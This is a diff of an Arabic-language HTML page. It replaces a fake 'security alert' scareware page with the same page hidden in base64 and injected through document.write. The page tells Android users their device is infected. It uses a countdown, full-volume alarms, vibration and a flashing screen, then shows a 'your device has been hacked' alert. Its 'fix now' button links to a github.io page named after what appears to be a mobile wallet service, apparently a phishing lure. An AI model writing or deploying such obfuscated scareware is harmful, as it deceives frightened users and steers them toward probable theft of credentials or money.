@@ -1,128 +1,17 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
-  <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ تنبيه الفيروسات ⚠️</title>
-    <style>
-      * {
-        box-sizing: border-box;
-        margin: 0;
-        padding: 0;
-      }
-
-      html, body {
-        height: 100%;
-        width: 100%;
-        background-color: black;
-        color: red;
-        font-family: Arial, sans-serif;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        text-align: center;
-        overflow: hidden;
-      }
-
-      h1 {
-        font-size: 7vw;
-        margin-bottom: 20px;
-      }
-
-      p {
-        font-size: 5vw;
-        margin: 10px 0;
-      }
-
-      #countdown {
-        font-size: 6vw;
-        font-weight: bold;
-      }
-
-      button {
-        margin-top: 30px;
-        padding: 15px 30px;
-        font-size: 5vw;
-        cursor: pointer;
-        background-color: red;
-        color: white;
-        border: none;
-        border-radius: 10px;
-        animation: pulse 1s infinite;
-      }
-
-      .flash {
-        animation: flash-bg 0.2s infinite alternate;
-      }
-
-      @keyframes flash-bg {
-        from { background-color: red; }
-        to { background-color: white; color: black; }
-      }
-
-      @keyframes pulse {
-        0% { transform: scale(1); }
-        50% { transform: scale(1.1); }
-        100% { transform: scale(1); }
-      }
-    </style>
-  </head>
-  <body>
-    <h1>⚠️ تنبيه أمني خطير ⚠️</h1>
-    <p>جهاز Android الخاص بك مصاب!</p>
-    <p>إذا لم يتم إصلاحه في <span id="countdown">10</span> ثانية، ستفقد بياناتك!</p>
-
-    <button onclick="window.location.href='https://sn4a5s6h.github.io/jawali.com.ye/'">إصلاح الآن</button>
-
-    <!-- صوت إنذار أول -->
-    <audio id="alarm-sound">
-      <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg" type="audio/ogg">
-    </audio>
-
-    <!-- صوت صدمة نهائية -->
-    <audio id="final-sound">
-      <source src="https://actions.google.com/sounds/v1/alarms/digital_watch_alarm_long.ogg" type="audio/ogg">
-    </audio>
-
-    <script>
-      let timeLeft = 10;
-      const countdownEl = document.getElementById("countdown");
-      const alarmSound = document.getElementById("alarm-sound");
-      const finalSound = document.getElementById("final-sound");
-      const body = document.body;
-
-      // رفع مستوى الصوت إلى 100%
-      alarmSound.volume = 1.0;
-      finalSound.volume = 1.0;
-
-      const timer = setInterval(() => {
-        timeLeft--;
-        countdownEl.textContent = timeLeft;
-
-        if (timeLeft === 8) {
-          alarmSound.play();
-        }
-
-        if (timeLeft === 7 && navigator.vibrate) {
-          navigator.vibrate([500, 200, 500]);
-        }
-
-        if (timeLeft <= 0) {
-          clearInterval(timer);
-          countdownEl.textContent = "0";
-          finalSound.play();
-          body.classList.add("flash");
-
-          if (navigator.vibrate) {
-            navigator.vibrate([300, 100, 300, 100, 300]);
-          }
-
-          setTimeout(() => {
-            alert("تم اختراق جهازك");
-          }, 1500);
-        }
-      }, 1000);
-    </script>
-  </body>
-</html> 
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>صعبة</title>
+</head>
+<body>
+<script>
+  // 
+  function b64_to_utf8(str) {
+    return decodeURIComponent(escape(atob(str)));
+  }
+  let code = "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImFyIiBkaXI9InJ0bCI+CiAgPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgbWF4aW11bS1zY2FsZT0xLjAsIHVzZXItc2NhbGFibGU9bm8iPgogICAgPHRpdGxlPuKaoO+4jyDYqtmG2KjZitmHINin2YTZgdmK2LHZiNiz2KfYqiDimqDvuI88L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAqIHsKICAgICAgICBib3gtc2l6aW5nOiBib3JkZXItYm94OwogICAgICAgIG1hcmdpbjogMDsKICAgICAgICBwYWRkaW5nOiAwOwogICAgICB9CgogICAgICBodG1sLCBib2R5IHsKICAgICAgICBoZWlnaHQ6IDEwMCU7CiAgICAgICAgd2lkdGg6IDEwMCU7CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogYmxhY2s7CiAgICAgICAgY29sb3I6IHJlZDsKICAgICAgICBmb250LWZhbWlseTogQXJpYWwsIHNhbnMtc2VyaWY7CiAgICAgICAgZGlzcGxheTogZmxleDsKICAgICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwogICAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwogICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgIH0KCiAgICAgIGgxIHsKICAgICAgICBmb250LXNpemU6IDd2dzsKICAgICAgICBtYXJnaW4tYm90dG9tOiAyMHB4OwogICAgICB9CgogICAgICBwIHsKICAgICAgICBmb250LXNpemU6IDV2dzsKICAgICAgICBtYXJnaW46IDEwcHggMDsKICAgICAgfQoKICAgICAgI2NvdW50ZG93biB7CiAgICAgICAgZm9udC1zaXplOiA2dnc7CiAgICAgICAgZm9udC13ZWlnaHQ6IGJvbGQ7CiAgICAgIH0KCiAgICAgIGJ1dHRvbiB7CiAgICAgICAgbWFyZ2luLXRvcDogMzBweDsKICAgICAgICBwYWRkaW5nOiAxNXB4IDMwcHg7CiAgICAgICAgZm9udC1zaXplOiA1dnc7CiAgICAgICAgY3Vyc29yOiBwb2ludGVyOwogICAgICAgIGJhY2tncm91bmQtY29sb3I6IHJlZDsKICAgICAgICBjb2xvcjogd2hpdGU7CiAgICAgICAgYm9yZGVyOiBub25lOwogICAgICAgIGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgICAgICAgYW5pbWF0aW9uOiBwdWxzZSAxcyBpbmZpbml0ZTsKICAgICAgfQoKICAgICAgLmZsYXNoIHsKICAgICAgICBhbmltYXRpb246IGZsYXNoLWJnIDAuMnMgaW5maW5pdGUgYWx0ZXJuYXRlOwogICAgICB9CgogICAgICBAa2V5ZnJhbWVzIGZsYXNoLWJnIHsKICAgICAgICBmcm9tIHsgYmFja2dyb3VuZC1jb2xvcjogcmVkOyB9CiAgICAgICAgdG8geyBiYWNrZ3JvdW5kLWNvbG9yOiB3aGl0ZTsgY29sb3I6IGJsYWNrOyB9CiAgICAgIH0KCiAgICAgIEBrZXlmcmFtZXMgcHVsc2UgewogICAgICAgIDAlIHsgdHJhbnNmb3JtOiBzY2FsZSgxKTsgfQogICAgICAgIDUwJSB7IHRyYW5zZm9ybTogc2NhbGUoMS4xKTsgfQogICAgICAgIDEwMCUgeyB0cmFuc2Zvcm06IHNjYWxlKDEpOyB9CiAgICAgIH0KICAgIDwvc3R5bGU+CiAgPC9oZWFkPgogIDxib2R5PgogICAgPGgxPuKaoO+4jyDYqtmG2KjZitmHINij2YXZhtmKINiu2LfZitixIOKaoO+4jzwvaDE+CiAgICA8cD7YrNmH2KfYsiBBbmRyb2lkINin2YTYrtin2LUg2KjZgyDZhdi12KfYqCE8L3A+CiAgICA8cD7Ypdiw2Kcg2YTZhSDZitiq2YUg2KXYtdmE2KfYrdmHINmB2YogPHNwYW4gaWQ9ImNvdW50ZG93biI+MTA8L3NwYW4+INir2KfZhtmK2KnYjCDYs9iq2YHZgtivINio2YrYp9mG2KfYqtmDITwvcD4KCiAgICA8YnV0dG9uIG9uY2xpY2s9IndpbmRvdy5sb2NhdGlvbi5ocmVmPSdodHRwczovL3NuNGE1czZoLmdpdGh1Yi5pby9qYXdhbGkuY29tLnllLyciPtil2LXZhNin2K0g2KfZhNii2YY8L2J1dHRvbj4KCiAgICA8IS0tINi12YjYqiDYpdmG2LDYp9ixINij2YjZhCAtLT4KICAgIDxhdWRpbyBpZD0iYWxhcm0tc291bmQiPgogICAgICA8c291cmNlIHNyYz0iaHR0cHM6Ly9hY3Rpb25zLmdvb2dsZS5jb20vc291bmRzL3YxL2FsYXJtcy9hbGFybV9jbG9jay5vZ2ciIHR5cGU9ImF1ZGlvL29nZyI+CiAgICA8L2F1ZGlvPgoKICAgIDwhLS0g2LXZiNiqINi12K/ZhdipINmG2YfYp9im2YrYqSAtLT4KICAgIDxhdWRpbyBpZD0iZmluYWwtc291bmQiPgogICAgICA8c291cmNlIHNyYz0iaHR0cHM6Ly9hY3Rpb25zLmdvb2dsZS5jb20vc291bmRzL3YxL2FsYXJtcy9kaWdpdGFsX3dhdGNoX2FsYXJtX2xvbmcub2dnIiB0eXBlPSJhdWRpby9vZ2ciPgogICAgPC9hdWRpbz4KCiAgICA8c2NyaXB0PgogICAgICBsZXQgdGltZUxlZnQgPSAxMDsKICAgICAgY29uc3QgY291bnRkb3duRWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY291bnRkb3duIik7CiAgICAgIGNvbnN0IGFsYXJtU291bmQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYWxhcm0tc291bmQiKTsKICAgICAgY29uc3QgZmluYWxTb3VuZCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJmaW5hbC1zb3VuZCIpOwogICAgICBjb25zdCBib2R5ID0gZG9jdW1lbnQuYm9keTsKCiAgICAgIC8vINix2YHYuSDZhdiz2KrZiNmJINin2YTYtdmI2Kog2KXZhNmJIDEwMCUKICAgICAgYWxhcm1Tb3VuZC52b2x1bWUgPSAxLjA7CiAgICAgIGZpbmFsU291bmQudm9sdW1lID0gMS4wOwoKICAgICAgY29uc3QgdGltZXIgPSBzZXRJbnRlcnZhbCgoKSA9PiB7CiAgICAgICAgdGltZUxlZnQtLTsKICAgICAgICBjb3VudGRvd25FbC50ZXh0Q29udGVudCA9IHRpbWVMZWZ0OwoKICAgICAgICBpZiAodGltZUxlZnQgPT09IDgpIHsKICAgICAgICAgIGFsYXJtU291bmQucGxheSgpOwogICAgICAgIH0KCiAgICAgICAgaWYgKHRpbWVMZWZ0ID09PSA3ICYmIG5hdmlnYXRvci52aWJyYXRlKSB7CiAgICAgICAgICBuYXZpZ2F0b3IudmlicmF0ZShbNTAwLCAyMDAsIDUwMF0pOwogICAgICAgIH0KCiAgICAgICAgaWYgKHRpbWVMZWZ0IDw9IDApIHsKICAgICAgICAgIGNsZWFySW50ZXJ2YWwodGltZXIpOwogICAgICAgICAgY291bnRkb3duRWwudGV4dENvbnRlbnQgPSAiMCI7CiAgICAgICAgICBmaW5hbFNvdW5kLnBsYXkoKTsKICAgICAgICAgIGJvZHkuY2xhc3NMaXN0LmFkZCgiZmxhc2giKTsKCiAgICAgICAgICBpZiAobmF2aWdhdG9yLnZpYnJhdGUpIHsKICAgICAgICAgICAgbmF2aWdhdG9yLnZpYnJhdGUoWzMwMCwgMTAwLCAzMDAsIDEwMCwgMzAwXSk7CiAgICAgICAgICB9CgogICAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgIGFsZXJ0KCLYqtmFINin2K7Yqtix2KfZgiDYrNmH2KfYstmDIik7CiAgICAgICAgICB9LCAxNTAwKTsKICAgICAgICB9CiAgICAgIH0sIDEwMDApOwogICAgPC9zY3JpcHQ+CiAgPC9ib2R5Pgo8L2h0bWw+IAo=";
+  document.write(b64_to_utf8(code));
+</script>
+</body>
+</html>
